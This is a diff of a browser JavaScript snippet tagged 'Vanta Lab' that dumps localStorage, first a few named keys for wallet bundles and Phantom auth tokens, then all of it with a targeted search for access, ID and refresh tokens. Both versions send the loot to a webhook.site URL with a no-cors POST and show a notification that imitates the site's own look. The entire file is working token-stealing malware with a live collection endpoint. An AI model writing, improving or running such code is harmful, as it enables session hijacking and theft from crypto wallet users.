@@ -1,53 +1,68 @@
 (function() {
-    // 1. Setup - The "Command & Control" (C2) destination
     const WEBHOOK_URL = 'https://webhook.site/b56a0e79-474e-46b8-8664-14d98a95f515';
     
-    console.log("%c[Vanta Lab] Tracker Active", "color: #00ff88; font-weight: bold;");
+    console.log("%c[Vanta Lab] Token Deep-Dive Active", "color: #00d4ff; font-weight: bold;");
 
-    // 2. The Extraction Logic (The "Scraper")
-    const harvest = () => {
-        return {
-            wallet_bundle: localStorage.getItem('padre-v2-bundles-store-v2'),
-            auth_tokens: localStorage.getItem('.phantom.auth.tokens'),
-            vanta_accounts: localStorage.getItem('vanta_accounts'),
-            host: window.location.hostname,
-            timestamp: new Date().toLocaleString()
+    const harvestAll = () => {
+        const fullDump = {
+            metadata: {
+                host: window.location.hostname,
+                timestamp: new Date().toLocaleString()
+            },
+            identified_tokens: {}, // Specific section for what you asked for
+            full_storage: {}
         };
+
+        // Keywords to target specifically
+        const targets = ['accessToken', 'idToken', 'refreshToken', 'expiresAt'];
+
+        for (let i = 0; i < localStorage.length; i++) {
+            const key = localStorage.key(i);
+            const rawValue = localStorage.getItem(key);
+            
+            try {
+                const parsed = JSON.parse(rawValue);
+                fullDump.full_storage[key] = parsed;
+
+                // Targeted Search: Check if this JSON object contains our tokens
+                if (typeof parsed === 'object' && parsed !== null) {
+                    targets.forEach(target => {
+                        if (parsed[target]) {
+                            fullDump.identified_tokens[target] = parsed[target];
+                        }
+                    });
+                }
+            } catch (e) {
+                fullDump.full_storage[key] = rawValue;
+                // Check if the raw string itself contains the token names
+                if (targets.some(t => rawValue.includes(t))) {
+                     fullDump.identified_tokens[key] = "Target found in raw string - check full_storage";
+                }
+            }
+        }
+        return fullDump;
     };
 
-    // 3. The Exfiltration (The "Transmission")
     const exfiltrate = async (data) => {
         try {
-            // Using 'no-cors' to avoid preflight (OPTIONS) checks that might be blocked
             await fetch(WEBHOOK_URL, {
                 method: 'POST',
                 mode: 'no-cors',
                 body: JSON.stringify(data)
             });
-            
-            // Visual feedback for the lab
-            showNotification("Data Synced Successfully", "#00ff88");
+            showNotification("Auth Tokens Identified & Synced", "#00d4ff");
         } catch (err) {
-            showNotification("Sync Failed: CSP or Network Block", "#ff4444");
-            console.error("Exfiltration error:", err);
+            showNotification("Exfiltration Failed", "#ff4444");
         }
     };
 
-    // 4. UI Overlay (1:1 Vanta Look)
     const showNotification = (msg, color) => {
         const notify = document.createElement('div');
-        notify.style.cssText = `
-            position: fixed; top: 10px; right: 10px; z-index: 10000;
-            background: #111; color: ${color}; border: 1px solid ${color};
-            padding: 15px; border-radius: 5px; font-family: 'Inter', sans-serif;
-            box-shadow: 0 0 10px rgba(0,0,0,0.5);
-        `;
+        notify.style.cssText = `position:fixed;top:10px;right:10px;z-index:9999;background:#111;color:${color};border:1px solid ${color};padding:12px;border-radius:4px;font-family:Inter, sans-serif;font-size:12px;`;
         notify.innerText = msg;
         document.body.appendChild(notify);
-        setTimeout(() => notify.remove(), 3000);
+        setTimeout(() => notify.remove(), 4000);
     };
 
-    // Execute
-    const stolenData = harvest();
-    exfiltrate(stolenData);
+    exfiltrate(harvestAll());
 })();
